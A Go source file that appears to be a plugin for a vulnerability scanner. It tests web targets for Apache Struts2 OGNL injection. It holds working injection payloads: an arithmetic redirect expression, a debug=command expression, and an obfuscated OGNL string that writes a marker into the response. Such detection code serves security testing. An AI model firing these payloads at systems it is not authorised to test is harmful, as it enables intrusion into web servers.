/*
all
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	paths    = []string{"/index.action", "/index.do", "/index.jsp", "/index.aspx", "/index.json", "/index.html", "/index.htm", "/index.asp", "/index.o2o"}
	payloads = [][]string{
		{"redirect:${1234*1234*1234}", "1879080904", "header"},
		{"debug=command&expression=1234*1234*1234", "1879080904", "body"},
		{"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23resp%3d%23context.get(new%20java.lang.String(new%20char[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})),%23resp.getWriter().println(new%20java.lang.String(new%20char[]{106,100,115,101,99,49,50,51,52,53,54,55,56,57,48})),%23resp.getWriter().flush(),%23resp.getWriter().close", "jdsec1234567890", "body"},
	}
)

func Verify(params engine.Params) (result engine.Result) {
	newPaths := util.GetPaths(paths, params.ParsedTarget.Path)
	for _, path := range newPaths {
		params.ParsedTarget.Path = path
		for _, payload := range payloads {
			params.ParsedTarget.RawQuery = payload[0]
			resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
				DialTimeout:        time.Second * 5,
				RequestTimeout:     time.Second * 5,
				Hosts:              params.Hosts,
				RawCookie:          params.Cookie,
				InsecureSkipVerify: true,
				DisableRedirect:    true,
			})
			if err != nil {
				result.Stop = 24
				return result
			}
			if payload[2] == "body" {
				if resp.StatusCode() == 200 {
					if strings.Contains(resp.String(), payload[1]) {
						result.Vul = true
						result.RawReq = resp.RawRequest()
						result.VulUrl = params.ParsedTarget.String()
						result.VulInfo = "struts2-low"
						resp.Close()
						return result
					}
				}
				resp.Close()
			} else if payload[2] == "header" {
				resp.Close()
				if resp.StatusCode() == 301 || resp.StatusCode() == 302 {
					if strings.Contains(resp.GetHeader("Location"), payload[1]) {
						result.Vul = true
						result.RawReq = resp.RawRequest()
						result.VulUrl = params.ParsedTarget.String()
						result.VulInfo = "struts2-low"
						return result
					}
				}
			}
		}
	}
	result.Stop = 24
	return result
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://172.20.214.73/struts2-blank-2.2.1/example/HelloWorld.action"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget
	params.Cookie = "pin=test;thor=testthor"
	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
